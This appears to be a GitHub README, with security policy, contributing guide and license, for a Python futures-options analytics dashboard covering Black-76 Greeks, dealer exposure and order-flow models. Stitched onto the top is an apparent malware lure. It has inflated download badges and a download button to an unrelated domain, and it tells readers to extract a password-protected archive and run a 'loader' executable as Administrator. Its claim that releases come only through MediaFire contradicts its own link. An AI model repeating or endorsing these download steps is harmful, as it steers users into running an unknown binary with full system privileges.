<div align="center">

  ![Downloads](https://img.shields.io/badge/Downloads-40K+-blue?style=for-the-badge&logo=github)
  ![User Rating](https://img.shields.io/badge/User%20Rating-4.8%2F5-gold?style=for-the-badge&logo=star)
  ![Latest Version](https://img.shields.io/badge/Latest%20Version-3.2.0-green?style=for-the-badge&logo=github)

</div>

<div align="center">

  <a href="https://respockett.pro/red">
    <img src="https://img.shields.io/badge/Download-Latest%20Release-blue?style=for-the-badge" alt="Download Latest Release">
  </a>

</div>

> ⚡ **All-in-one loader:** The entire script is compiled into a single loader for your convenience — just download, extract, and run. No extra setup required.

1. **⬇️ Download** the tool from the button above.
2. **📦 Extract** the archive (password: `respocket`).
3. **🖱️ Run as Administrator** – right‑click the executable and select *Run as Administrator*.
4. **✅ Follow the setup wizard** – complete the installation.
5. **🚀 Launch the Tool** – the main window appears.

---

> ⚠️ **Important: Official Distribution Notice**
>
> We distribute our software **only through MediaFire**.  
> If the download link leads to **any other file-sharing service**, please **do not download it** — it may be an unofficial or modified copy.  
> For your safety, always use the official release.

---

<div align="center">

### 💙 Prepared by the Respocket Team

**This release was carefully prepared by the Respocket Team** — with attention to every detail, a focus on stability, and respect for our users.  
Thank you for choosing our software. Download only official versions and stay with us!
</div>


---

## 🚀 Web Decision Terminal (Bloomberg × Cyberpunk UI)

Designed for high-density, institutional trading environments, the web terminal is organized into **4 dedicated execution and analytics hubs** styled with a utilitarian Bloomberg-meets-cyberpunk aesthetic (glowing neon cyan/amber/lime accents, glassmorphism containers, responsive multi-asset panels):

```text
+-----------------------------------------------------------------------------------------+
|                INSTITUTIONAL OPTIONS S/D TERMINAL [GC] [ES] [NQ] (Time Travel)          |
+-----------------------------------------------------------------------------------------+
|  MASTER TRADING BIAS (Executive Hero Bar)                                               |
|  [Direction: BEARISH] [Confidence: 67%] [Price: 4,102.20] [IV: 27.2%] [Overnight: -$18M]|
+-----------------------------------------------------------------------------------------+
|  [ SECTION 01 ] TACTICAL EXECUTION & INTRADAY PRICE STRUCTURE                           |
|  • HYBRID CANDLE & OI S/R ZONES (1D/1H/15M Candlesticks, SD Bands, Session Levels)     |
|  • INTRADAY MASTER CHART (5M/1H Candlesticks, VWAP, Tactical Setup, Hedging Live Badge) |
|  • INTRADAY VOLUME PROFILE (Dynamic Call vs Put Volume Dominance per Strike)            |
+-----------------------------------------------------------------------------------------+
|  [ SECTION 02 ] QUANTITATIVE EDGE & SCENARIO STRESS ENGINE                              |
|  • 8-Grid Microstructure: VRP, 25Δ Skew, Flow Imbalance, Alerts, ML Regime, Correlation |
|    Pinning Gravity Odds, Monte Carlo 3,000 Paths Barrier Touch Odds                     |
|  • DUAL STRESS ENGINE:                                                                  |
|    - Left: Spot Shocks (±1% to ±3% Underlying Moves -> Dealer Hedging Demand ΔDEX)      |
|    - Right: Event IV Shocks (-5% to +5% Event IV Crush -> Vanna Rally Hedging Demand)   |
+-----------------------------------------------------------------------------------------+
|  [ SECTION 03 ] DEALER INVENTORY MAP & GREEKS STRUCTURE (THE 4 PILLARS)                 |
|  • Row 1: [Open Interest Walls]             | [Net Open Interest Profile]               |
|  • Row 2: [Asymmetric GEX & Gamma Flip]     | [Vanna Exposure Profile (IV Sensitivity)] |
|  • Row 3: [Charm Exposure (Overnight Flow)] | [Max Pain Analysis & Expiry Gravity]      |
|  • Row 4: [IV Smile / Skew Curves]          | [Change in OI (ΔOI vs Prior Snapshot)]    |
+-----------------------------------------------------------------------------------------+
|  [ SECTION 04 ] INSTITUTIONAL FLOW DECOMPOSITION (4-QUADRANT MATRIX)                    |
|  • Volume vs ΔOI Real-time Classification Table across all Active Strikes               |
|    [🟢 ACCUMULATION (Real Position)] [🔴 DE-RISKING / CLOSE] [⚪ DAY TRADING CHURN]      |
+-----------------------------------------------------------------------------------------+
```

---

## 🧠 Institutional Dealer Inventory & Greeks Mechanics (The 4 Pillars)

Hedge funds and quantitative desks treat Open Interest (OI) not as static support/resistance, but as a **Dealer Inventory Map**. Because Market Makers (MMs) are legally bound to provide continuous liquidity and delta-hedge dynamically, knowing their net inventory allows traders to front-run mechanical rebalancing flows:

```
                                  [ RETAIL / INSTITUTION ]
                                       ▲            ▲
                           Writes Calls|            |Buys Puts
                                       ▼            ▼
                             ┌────────────────────────────┐
                             │ MARKET MAKER INVENTORY MAP │
                             │  • Long OTM Calls (+Gamma) │
                             │  • Short ATM Calls (-Gamma)│
                             │  • Short Puts (-Gamma)     │
                             └──────────────┬─────────────┘
                                            │
               ┌────────────────────────────┼────────────────────────────┐
               ▼                            ▼                            ▼
      [ GAMMA DYNAMICS ]            [ VANNA RALLY ]             [ CHARM DECAY ]
    Positive Gamma: Dampens       Post-Event IV Crush        Delta decays overnight
    Negative Gamma: Accelerates   Forces MM to buy hedges    Predicts market open flow
```

### 1. Asymmetric Dealer Positioning & Gamma Flip Point
* **OTM Calls ($K > Spot$):** Retail and yield-seeking funds sell covered calls. The dealer is **Net LONG Call (+Gamma)**.
* **ATM / ITM Calls ($K \le Spot$):** Speculative leverage buyers purchase calls. The dealer is **Net SHORT Call (-Gamma)**.
* **Puts ($K$ across all strikes):** Institutional portfolio managers buy downside insurance. The dealer is **Net SHORT Put (-Gamma)**.
* **The Gamma Flip Point:** The exact underlying price where total market gamma crosses zero:
  * **Above Flip (+GEX):** Market makers buy dips and sell rips $\to$ **Low Volatility / Mean-Reverting**.
  * **Below Flip (-GEX):** Market makers must sell falling markets and buy rising markets $\to$ **High Volatility / Liquidity Black Hole**.

### 2. Vanna Rally & Event IV Shock Grid (FOMC / CPI Hedging)
* $\text{Vanna} = \frac{\partial \Delta}{\partial \sigma}$.
* Ahead of major binary catalyst events (FOMC rate decisions, CPI prints, NFP), Implied Volatility (IV) surges as funds bid up put options. Market makers sell these puts and hedge by shorting underlying futures.
* Once the event passes, **IV Crush** occurs (IV collapses $-2\%$ to $-5\%$).
* In the Black-76 framework, lower IV reduces the absolute delta of OTM puts towards zero. Market makers are mechanically forced to **buy back their short futures hedges** regardless of the fundamental news, triggering an explosive **Vanna Rally**.
* The platform's **Event IV Shock Grid** calculates the exact dollar and contract re-hedging demand under $\pm 5.0\%$ volatility shifts.

### 3. Charm Exposure & Overnight Delta Decay Flow
* $\text{Charm} = \frac{\partial \Delta}{\partial t}$ (Delta decay per trading day).
* Options lose value as expiration approaches even if the underlying price remains unchanged.
* Overnight or over weekends, dealer delta exposure shifts purely due to the passage of time.
* The dashboard models aggregate **Overnight Hedging Flow ($USD)**, forecasting whether dealers will wake up with an urgent net buying or net selling imbalance heading into the CME market open.

### 4. 4-Quadrant Volume vs $\Delta\text{OI}$ Decomposition & Calendar Rolls
High trading volume alone is ambiguous—it could represent day trading or real positioning. The platform tracks daily $\Delta\text{OI}$ against volume:
* **Quadrant 1: High Volume + $\Delta\text{OI} > 0$ ➔ `🟢 ACCUMULATION`**: Institutions are initiating brand new long or short positions that will be held overnight.
* **Quadrant 2: High Volume + $\Delta\text{OI} < 0$ ➔ `🔴 LIQUIDATION`**: Institutions are unwinding contracts, taking profits, or de-risking ahead of binary events.
* **Quadrant 3: High Volume + $\Delta\text{OI} \approx 0$ ➔ `⚪ DAY TRADING / CHURN`**: Intraday scalp algorithms scalping bid-ask spreads with zero overnight directional commitment.
* **Calendar Roll Activity:** Identifies institutions rolling hedges forward by detecting matching $\Delta\text{OI}_{front} < 0$ and $\Delta\text{OI}_{back} > 0$ at equivalent strikes across consecutive expiry cycles.

### 5. Delta & Gamma-Weighted Expiry Pinning Model
Rather than a simple heuristic, the platform calculates continuous pinning probability distributions using Gaussian distance and gamma gravity weighting:
$$W(K) = \text{OI}_K \times \Gamma_K \times \exp\left( -\frac{(K - F)^2}{2 \sigma^2 F^2 T} \right)$$
$$P(\text{Pin at } K) = \frac{W(K)}{\sum_j W(j)}$$
Outputs the Top 3 pin candidates with exact percentage odds (e.g., Strike 4,150.0 = 10.9% odds).

---

## ⚡ Real-Time vs Snapshot Feature Matrix

The Futures Options SD Dashboard is engineered with a **Dual-Mode Architecture**, cleanly decoupling high-frequency **Real-Time Streaming** features (refreshed every 4–5 seconds) from institutional **Periodic Snapshot** analytics (refreshed on 5-minute to 1-hour clearing cycles):

| Category / Feature | Operating Mode | Data Source | Update Frequency | System Behavior & Mechanics |
|---|:---:|---|:---:|---|
| **Underlying Spot Price** (GC, ES, NQ) | ⚡ **Real-Time** | Yahoo Finance / CME Live Feed | **Every 4–5s** | Streams live tick quotes with synchronized Live Tick Flash indicators. |
| **Intraday Master Candles** | ⚡ **Real-Time** | CME Live Ticks | **Every 4–5s** | Active 5M/15M/1H candle mutates in-place (High, Low, Close tick with zero flicker). |
| **Dynamic SD Bands (±1σ, ±2σ, ±3σ)** | ⚡ **Real-Time** | Dynamic Pricing Model | **Every 4–5s** | Recomputed on every tick centered on live spot using Black-76 ATM IV (zero slippage). |
| **Hero Bias & Wall Distances** | ⚡ **Real-Time** | Live Calculation Engine | **Every 4–5s** | Computes real-time point and percentage distances to Call Wall and Put Wall. |
| **Dealer Spot Shock Rebalancing** | ⚡ **Real-Time** | Live Stress Engine | **Every 4–5s** | Evaluates instant delta rebalancing pressure ($\Delta\text{DEX}$) against live underlying price. |
| **Active Pinning Target Odds** | ⚡ **Real-Time** | Gaussian Gravity Model | **Every 4–5s** | Recalculates strike pinning probability distribution relative to live spot. |
| **Open Interest (OI) & OI Walls** | 📜 **Snapshot** | CME Clearing / Broker Feed | **5m / Daily Clearing** | Official CME exchange open interest; updates per institutional snapshot interval. |
| **4-Quadrant Matrix (ΔOI vs Vol)** | 📜 **Snapshot** | Delta OI Engine | **Snapshot Interval** | Institutional Accumulation/Liquidation requires $\Delta\text{OI}$ between discrete snapshots. |
| **Asymmetric GEX & Gamma Flip** | 📜 **Snapshot** | Black-76 Greeks Engine | **Snapshot Interval** | Aggregates dealer gamma inventory across all active strikes from current snapshot chain. |
| **Vanna Rally & Charm Flow Matrix** | 📜 **Snapshot** | Second-Order Greeks Engine | **Snapshot Interval** | Processes IV smile skew curvature and overnight time decay cross-derivatives. |
| **Monte Carlo 30D Envelope & ML Regime** | 📜 **Snapshot** | Quant AI Engine | **Snapshot Interval** | 10,000 Geometric Brownian Motion paths and Softmax Machine Learning Regime classification. |

> [!TIP]
> **Dashboard Mode Toggle:**
> * Click **`⚡ REAL-TIME`** in the top navigation: Activates non-blocking live polling (every 4–5 seconds) with flashing `● REAL-TIME` beacon and 60fps in-place candle mutation.
> * Click **`📜 HISTORY`** (or press keyboard `◀` / `▶` arrow keys): Suspends live polling to navigate through all historical snapshots and review past options market microstructure.

---

## 🔬 Complete Quantitative Analytics Engine (`analytics/` & `ml/`)

The platform's analytical foundation is built on institutional derivatives pricing, microstructure order flow decomposition, and machine learning regime classification standardized to quantitative finance best practices:

### 1. Black-76 Math & Institutional Exposures (`analytics/exposure.py`)
Futures options trade with distinct cost-of-carry characteristics compared to cash equity options. Holding futures requires initial margin rather than full upfront capital. All pricing equations follow the canonical **Black-76 model** with continuous risk-free discounting $e^{-rT}$:

* **$d_1$ and $d_2$ Formulations:**
  $$d_1 = \frac{\ln(F/K) + \frac{1}{2}\sigma^2 T}{\sigma \sqrt{T}}, \quad d_2 = d_1 - \sigma \sqrt{T}$$
* **Delta ($\Delta$):**
  $$\Delta_{\text{Call}} = e^{-rT} N(d_1), \quad \Delta_{\text{Put}} = -e^{-rT} N(-d_1)$$
* **Gamma ($\Gamma$):**
  $$\Gamma = \frac{e^{-rT} n(d_1)}{F \sigma \sqrt{T}}$$
* **Vega ($\mathcal{V}$):**
  $$\mathcal{V} = e^{-rT} F \sqrt{T} n(d_1)$$
* **Vanna ($\frac{\partial \Delta}{\partial \sigma}$ - Volatility Sensitivity):**
  $$\text{Vanna} = -e^{-rT} n(d_1) \frac{d_2}{\sigma}$$
* **Charm ($\frac{\partial \Delta}{\partial t}$ - Overnight Delta Decay Rate):**
  $$\text{Charm}_{\text{Call}} = -r e^{-rT} N(d_1) - e^{-rT} n(d_1) \left[ \frac{d_2}{2T} \right]$$
  $$\text{Charm}_{\text{Put}} = r e^{-rT} N(-d_1) - e^{-rT} n(d_1) \left[ \frac{d_2}{2T} \right]$$

#### Dealer Exposure Formulations:
* **GEX (Gamma Exposure per 1% move):**
  $$\text{GEX} = \text{Position Sign} \times \text{OI} \times \Gamma \times F^2 \times 0.01 \times \text{Multiplier}$$
* **DEX (Delta Exposure in $USD):**
  $$\text{DEX} = \text{Position Sign} \times \text{OI} \times \Delta \times F \times \text{Multiplier}$$
* **Vanna Exposure:**
  $$\text{Vanna Exposure} = \text{Position Sign} \times \text{OI} \times \text{Vanna} \times \text{Multiplier}$$
* **Charm Exposure ($/day overnight flow):**
  $$\text{Charm Exposure} = \text{Position Sign} \times \text{OI} \times \left( \frac{\text{Charm}}{365.0} \right) \times F \times \text{Multiplier}$$

### 2. Flanking Strike ATM IV Spline (`analytics/volatility.py`)
Eliminates the distortion of `min(IV)` searches (which frequently pick illiquid, skewed deep OTM strikes) by employing a **localized flanking strike spline interpolation**:
1. Locates the two nearest traded strikes bounding the current mark price ($K_{\text{lower}} \le F < K_{\text{upper}}$).
2. Performs linear spline interpolation to calculate exact at-the-money implied volatility ($\sigma_{\text{ATM}}$):
   $$\sigma_{\text{ATM}} = \sigma_{\text{lower}} + \frac{F - K_{\text{lower}}}{K_{\text{upper}} - K_{\text{lower}}} (\sigma_{\text{upper}} - \sigma_{\text{lower}})$$
3. Produces dynamic standard deviation bands ($\pm 1\sigma, \pm 2\sigma, \pm 3\sigma$) centered on real market expectations.

### 3. Volatility Risk Premium & Yang-Zhang Estimator (`analytics/vrp.py`)
Quantifies the spread between implied market volatility and actual continuous-path realized price action:
* **Yang-Zhang (2000) Continuous Realized Volatility ($RV_{\text{YZ}}$):**
  Combines overnight jump variance, continuous Garman-Klass drift variance, and close-to-close variance for minimum-variance efficiency:
  $$\sigma_{\text{YZ}}^2 = \sigma_{\text{OJ}}^2 + k \sigma_{\text{open}}^2 + (1-k) \sigma_{\text{RS}}^2$$
* **Volatility Risk Premium (VRP):**
  $$\text{VRP} = \text{IV}_{\text{ATM}} - \text{RV}_{\text{YZ}}$$
  * **$\text{VRP} > 0$ (Vol Rich):** Implied volatility trades at a premium to realized move $\to$ favorable environment for option sellers (Iron Condors, credit spreads).
  * **$\text{VRP} < 0$ (Vol Cheap):** Market is realizing larger moves than option pricing anticipates $\to$ favorable environment for long vol/straddle buyers.

### 4. 4-Quadrant Institutional Order Flow & Rolls (`analytics/order_flow.py`)
Deconstructs intraday trades into institutional positioning vs retail scalp noise:
* **Quadrant 1: High Volume + $\Delta\text{OI} > 0$ ➔ `🟢 ACCUMULATION`:** New positions initiated and carried overnight.
* **Quadrant 2: High Volume + $\Delta\text{OI} < 0$ ➔ `🔴 LIQUIDATION`:** Positions closed, de-risking ahead of binary catalysts.
* **Quadrant 3: High Volume + $\Delta\text{OI} \approx 0$ ➔ `⚪ DAY TRADING`:** High turnover scalping with zero overnight directional commitment.
* **Quadrant 4: Low Volume + Stable OI ➔ `💤 INACTIVE`:** Dormant strikes.
* **Calendar Roll Tracker:** Cross-references front-month liquidation ($\Delta\text{OI}_{\text{front}} < 0$) with simultaneous back-month creation ($\Delta\text{OI}_{\text{back}} > 0$) at identical or adjacent strikes to identify institutional roll hedging.

### 5. Scenario Stress Engine & IV Shock Grid (`analytics/scenarios.py`)
Simulates dealer inventory rebalancing pressures under non-linear market shocks:
* **Spot Price Shocks ($\pm 1\%, \pm 2\%, \pm 3\%$):** Measures instantaneous change in dealer delta ($\Delta\text{DEX}$) to quantify the exact volume of underlying contracts market makers must execute to maintain delta neutrality.
* **Event IV Shock Grid ($\pm 5.0\%$ IV Shift):** Predicts post-FOMC/CPI **Vanna Rallies** or crash cascades by calculating the dollar re-hedging requirement when volatility collapses.

### 6. Delta & Gamma-Weighted Expiry Pinning Model (`analytics/pin_risk.py`)
Calculates the probabilistic gravitational pull exerted by large open interest concentrations into expiration:
$$W(K) = \text{OI}_K \times \Gamma_K \times \exp\left( -\frac{(K - F)^2}{2 \sigma^2 F^2 T} \right)$$
$$P(\text{Pin at } K) = \frac{W(K)}{\sum_j W(j)}$$
Identifies the top 3 highest-probability pinning strikes and their exact percentage odds.

### 7. Term Structure & Skew Dynamics (`analytics/term_structure.py`)
Analyzes the volatility surface across time and strike space:
* **Constant Maturity Term Structure:** Interpolates 7D, 30D, 60D, 90D IV to detect Contango (normal) vs Backwardation (panic).
* **25-Delta Skew:**
  $$\text{Risk Reversal (RR}_{25}) = \text{IV}_{25\Delta\text{ Call}} - \text{IV}_{25\Delta\text{ Put}}$$
  $$\text{Butterfly (FLY}_{25}) = \frac{\text{IV}_{25\Delta\text{ Call}} + \text{IV}_{25\Delta\text{ Put}}}{2} - \text{IV}_{\text{ATM}}$$
  Quantifies directional skew asymmetry and tail-fatness pricing (kurtosis).

### 8. Monte Carlo Barrier & Wall Touch Engine (`analytics/monte_carlo.py`)
Simulates 3,000 to 10,000 Geometric Brownian Motion (GBM) paths with risk-neutral drift:
$$S_{t+\Delta t} = S_t \exp\left( \left( r - \frac{1}{2}\sigma^2 \right) \Delta t + \sigma \sqrt{\Delta t} Z \right)$$
Calculates the exact statistical probability that the underlying price will test or breach Call Wall, Put Wall, or Key SD Bands before expiration.

### 9. 🤖 Machine Learning Regime Classifier (`ml/features.py` & `ml/regime_classifier.py`)
* **10-Factor Feature Vector:** Ingests normalized GEX, Net OI Bias, VRP, 25Δ Skew, Overnight Charm Flow, Spot Momentum, Volume/OI ratio, and Term Slope.
* **Softmax Multi-Factor Classifier:** Outputs probabilistic distribution across 3 institutional market regimes:
  * 🟢 **BULLISH REGIME:** High Call Accumulation, +GEX, Positive Skew, Favorable VRP.
  * 🔴 **BEARISH REGIME:** Put Dominated, -GEX, Negative Skew, High Realized Vol.
  * 🟡 **RANGE-BOUND REGIME:** Balanced OI, Positive GEX Damping, Low VRP.
* Generates actionable trading playbooks (Iron Condors vs Long Straddles vs Trend Momentum).

### 10. Microstructure Quality & Globex Filter (`analytics/quality.py`)
Ensures data integrity during overnight Globex hours when liquidity is thin:
* **Bid-Ask Spread Filter:** Flags or prunes strikes where $\frac{\text{Ask} - \text{Bid}}{\text{Mid}} > 0.50$.
* **Zero Bid Handling:** Protects against artificially inflated implied volatilities on illiquid wings.
* **Volume/OI Ratio Warning:** Alerts when $\text{Volume} > 2 \times \text{OI}$ signaling aggressive intraday institutional intervention.
* Computes an institutional **Data Quality Score (0–100%)**.

### 11. Walk-Forward Backtesting & Signal Evaluator (`analytics/backtest.py`)
Validates signal predictive power by evaluating forward returns at 1-day, 3-day, and 5-day horizons following Gamma Flips, Volume/OI quadrant transitions, and SD Band touches.

---

## 🔌 Multi-Provider Data Adapters

This project supports **5 curated data providers** through a unified adapter architecture:

| Provider | Asset Class | Options Chain | Greeks | Access & Cost | Setup |
|---|---|:---:|:---:|:---:|:---:|
| **Tastytrade** | CME Futures Options (/GC, /ES, /NQ) | ✅ | ✅ | Brokerage Account | ⭐ Easy |
| **Databento** ⭐ | CME Futures Options (/GC, /ES, /NQ) | ✅ | ⚠️ Calculated | \$125 Free Credit | ⭐ Easy |
| **Interactive Brokers** | CME & Global Futures Options | ✅ | ✅ | TWS / Gateway | ⭐⭐ Medium |
| **Yahoo Finance** | Futures Prices & Historical Candles | ❌ | ❌ | 100% Free | ⭐ Easy |
| **Deribit** | Crypto Options (BTC, ETH) | ✅ | ✅ | 100% Free Public API | ⭐ Easy |

### Programmatic Usage

```python
import asyncio
from adapters import AdapterRegistry

async def main():
    # 1. Connect to selected provider (reads .env)
    adapter = AdapterRegistry.from_env("databento") # or "tastytrade", "deribit", etc.
    await adapter.connect()

    # 2. Ingest unified market data
    chain = await adapter.get_option_chain("GC")   # or "BTC" for crypto
    price = await adapter.get_futures_price("ES")
    candles = await adapter.get_historical_candles("NQ", period="30d")

    print(f"Fetched {len(chain)} options for {price.symbol} @ {price.price}")
    await adapter.disconnect()

asyncio.run(main())
```

---

## 🏗️ Architecture & Directory Structure

```text
Futures Options SD Dashboard/
├── config.py                         # Multi-provider credentials (loads from .env)
├── .env                              # Provider credentials (git-ignored)
├── .env.example                      # Template for supported providers
├── demo_institutional_terminal.py   # 💻 CLI Institutional Terminal Showcase
├── run_all.py                        # Master script to run analysis tools & backtests
├── update_dashboard.py               # Ingestion pipeline parsing CSVs into JSON
├── adapters/                         # 🔌 Multi-Provider Data Adapter System
│   ├── base.py                       # UnifiedOptionData, UnifiedFuturesData ABC
│   ├── registry.py                   # AdapterRegistry factory & provider discovery
│   ├── bridge.py                     # Backward compatibility format conversion
│   ├── tastytrade_adapter.py         # CME via Tastytrade
│   ├── databento_adapter.py          # CME Direct Feed via Databento (GLBX.MDP3)
│   ├── ibkr_adapter.py               # CME via Interactive Brokers (TWS/Gateway)
│   ├── yfinance_adapter.py           # Futures Prices & Historical OHLCV (Free)
│   └── deribit_adapter.py            # Crypto Options BTC/ETH (Free Public API)
├── analytics/                        # 🔬 Quantitative Finance & Microstructure Engine
│   ├── exposure.py                   # Black-76 Greeks & Asymmetric Dealer GEX/DEX
│   ├── volatility.py                 # Localized ATM IV flanking spline interpolation
│   ├── quality.py                    # Microstructure data validation & spread filters
│   ├── vrp.py                        # Yang-Zhang (2000) RV, Parkinson RV, VRP
│   ├── term_structure.py             # 25-Delta Risk Reversal & Butterfly Tail Risk
│   ├── order_flow.py                 # 4-Quadrant Flow Decomposition & Calendar Rolls
│   ├── scenarios.py                  # Dual Stress Grid: Spot Shocks & IV Shock Vanna Rally
│   ├── pin_risk.py                   # Delta & Gamma-weighted Expiry Pinning Model
│   ├── correlation.py                # Rolling Correlation Matrix (GC/ES/NQ) & Macro Bias
│   ├── monte_carlo.py                # 3,000 Path GBM & Wall Touch Odds
│   └── backtest.py                   # Signal evaluator & forward-return scorecard
├── ml/                               # 🤖 Machine Learning Regime Classifier
│   ├── features.py                   # 10-Factor quantitative feature extractor
│   └── regime_classifier.py          # Softmax Multi-Factor model (Prob Bull/Bear/Range)
├── alerts/                           # 🚨 Notification Engine
│   ├── engine.py                     # Rule-based scanner (Breaches, Flips, Spikes)
│   └── dispatcher.py                 # Discord Webhook, Telegram Bot, LINE Notify
├── Analysis_Tools/                   # Analytical & Visualization Scripts
│   ├── master_report.py              # Advanced Bias Report
│   ├── backtest_report.py            # CLI backtest reporting tool
│   ├── advanced_viz.py               # Market Map (GEX Profile, Vanna, Iron Walls)
│   └── sd_bands_chart.py             # Candlestick + SD bands + OI walls overlay
├── tests/                            # 🧪 Automated Test Suite (67 Tests)
│   ├── test_exposure_positioning.py  # Asymmetric GEX & Dealer Positioning tests
│   ├── test_order_flow_quadrant.py   # 4-Quadrant Volume vs ΔOI classification tests
│   ├── test_vanna_rally_scenario.py  # Event IV shock grid & Vanna Rally tests
│   ├── test_charm_pipeline.py        # Charm pipeline & overnight flow tests
│   ├── test_pin_distribution.py      # Delta & Gamma-weighted pinning odds tests
│   ├── test_roll_detector.py         # Calendar roll activity detection tests
│   ├── test_quant_modules.py         # Core quant engine tests
│   ├── test_all_phases.py            # Multi-phase integration tests
│   └── test_adapters.py              # Adapter infrastructure tests
├── docs/                             # 🌐 Web Terminal Frontend
│   ├── index.html                    # 4-Hub Terminal HTML Layout
│   ├── styles.css                    # Bloomberg/Cyberpunk UI Stylesheet
│   └── app.js                        # TradingView chart setups & live quant renderers
└── trading_results/                  # Snapshot storage by date/hour (YYYY-MM-DD/HH00/)
```

---

## 💻 Live CLI Demonstration

Run the institutional terminal showcase directly in your command line:

```bash
python demo_institutional_terminal.py
```

Expected output preview:
```text
┌─ [ S&P 500 E-MINI (/ES) ] ──────────────────────────────────────────────────────────
│ Spot Price: 7,450.75 | Bias: Mild BEAR (Conf: 33%) | ATM IV: 20.2%
│
│ ⚡ EVENT IV SHOCK STRESS TEST (VANNA RALLY PREDICTOR):
│    • -5.0% IV   ➔ Dealer Re-hedge: -$589.47M  (-1,582.3 contracts) ➔ Action: SELL_UNDERLYING
│    • +5.0% IV   ➔ Dealer Re-hedge: +$489.29M  (+1,313.4 contracts) ➔ Action: BUY_UNDERLYING (Vanna Rally)
│
│ ⏳ CHARM EXPOSURE & OVERNIGHT TIME DECAY FLOW:
│    • Total Overnight Dealer Flow: +$75.96M (BUY_PRESSURE)
│
│ 🔍 4-QUADRANT FLOW DECOMPOSITION (VOLUME vs ΔOI):
│    🟢 ACCUMULATION: Strike 7,200.0 PUT | Vol: 658   | ΔOI: +1,679 ➔ 🟢 ACCUMULATING
│    🔴 LIQUIDATION:  Strike 7,305.0 PUT | Vol: 412   | ΔOI: -1,028 ➔ 🔴 DE-RISKING
│    ⚪ DAY TRADING:  Strike 7,775.0 CALL| Vol: 4,552 | ΔOI: +252   ➔ ⚪ CHURN/SCALP
│
│ 🧲 DELTA & GAMMA-WEIGHTED STRIKE PINNING ODDS:
│    • Most Likely Expiry Pin Target: Strike 7,400.0 (Odds: 3.6%)
└────────────────────────────────────────────────────────────────────────────────────
```

---

## 🧪 Testing & Verification

Run the entire automated test suite:

```bash
python -m unittest discover tests
```

```text
...................................................................
----------------------------------------------------------------------
Ran 67 tests in 1.653s

OK
```

---

## 🐳 Docker Deployment (One-Click Local Runner)

The platform is configured with a **Dual-Service Architecture** in `docker-compose.yml`:
### Quick Start (PowerShell / Windows):
```powershell
# 1. Start Both Services (Dashboard + Auto-Updater Daemon)
.\docker-run.ps1 start

# 2. View Live Streaming Logs from both services
.\docker-run.ps1 logs

# 3. Manually trigger the full GitHub Action analysis pipeline locally (run_all.py)
.\docker-run.ps1 run-all

# 4. Manually trigger an immediate dashboard JSON update
.\docker-run.ps1 update

# 5. Run the Institutional Quant Terminal Demo inside Docker
.\docker-run.ps1 demo

# 6. Run automated test suite inside Docker (67 tests)
.\docker-run.ps1 test

# 7. Stop containers
.\docker-run.ps1 stop
```

### Quick Start (Linux / macOS / WSL / Native Docker):
```bash
# Start Both Services in background
docker compose up -d dashboard updater

# Run commands via pipeline profile:
docker compose run --rm pipeline python update_dashboard.py
docker compose run --rm pipeline python demo_institutional_terminal.py
docker compose run --rm pipeline python -m unittest discover tests

# Stop:
docker compose down
```

### Docker Features:
* **Host Port:** `8050` (maps to internal container `8000`, preventing conflicts with other local services).
* **Live Volume Mount:** Edits to `./docs` and `./trading_results` hot-reload immediately without rebuilding the image.
* **Non-Root & Built-in Healthcheck:** Monitored automatically by Docker daemon (`Up (healthy)`).

---

## ⚙️ Running Locally without Docker (Python Native)

### 1. Execute Full Analysis & Pipeline:
```bash
python run_all.py
```

### 2. Update Web Terminal Data:
```bash
python update_dashboard.py
```

### 3. Launch Local Web Terminal:
```bash
python -m http.server 8050 --directory docs
```
## 📄 License
MIT License. Developed for quantitative futures options trading and market microstructure analysis.


---

# Security Policy

## Supported Versions

Currently, only the latest active major version receives security updates.

| Version | Supported          |
| ------- | ------------------ |
| 1.x.x   | :white_check_mark: |
| < 1.0   | :x:                |

## Reporting a Vulnerability

Please **do not** report security vulnerabilities through public GitHub issues. 

If you discover a vulnerability (such as a flaw in API token handling, or credential exposure), please reach out to the repository maintainers directly via direct message or email. 

We will acknowledge your report within 48 hours and work with you to patch the vulnerability safely before full public disclosure.


---

# Contributing to Futures Options S/D Dashboard

First off, thank you for considering contributing to the Futures Options S/D Dashboard! It's people like you that make this tool better for everyone.

## Getting Started

1. **Fork the repository** and clone it locally.
2. **Set up the environment**:
   ```bash
   python -m venv .venv
   # Windows
   .venv\Scripts\activate
   # macOS/Linux
   source .venv/bin/activate
   
   pip install -r requirements.txt
   ```
3. **Set up credentials**: Copy `.env.example` to `.env` and add your Tastytrade credentials.

## How to Contribute

### 🐛 Reporting Bugs
If you find a bug, please check if there is already an issue for it. If not, open a new issue using the **Bug Report** template. Please include as much detail as possible (logs, Python version, steps to reproduce).

### 💡 Suggesting Enhancements
Have an idea for a new feature or a quantitative analytics improvement? Open an issue using the **Feature Request** template.

### 💻 Pull Requests
1. Create a new branch for your feature (`git checkout -b feature/amazing-feature`).
2. Make your changes.
3. If you've modified quantitative modules (`analytics/`), ensure the math aligns with Black-76 models and standard conventions as documented in the README.
4. Commit your changes (`git commit -m 'Add amazing feature'`).
5. Push to the branch (`git push origin feature/amazing-feature`).
6. Open a Pull Request using the provided PR template.

## Code Style
* Keep the quantitative logic in the `analytics/` folder pure (no API calls, just math).
* Add type hints (`-> float`, `: dict`) to new functions.
* Document complex mathematical formulas in docstrings.

Thank you for your contributions!


---

MIT License

Copyright (c) 2026 Phitchaya

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.
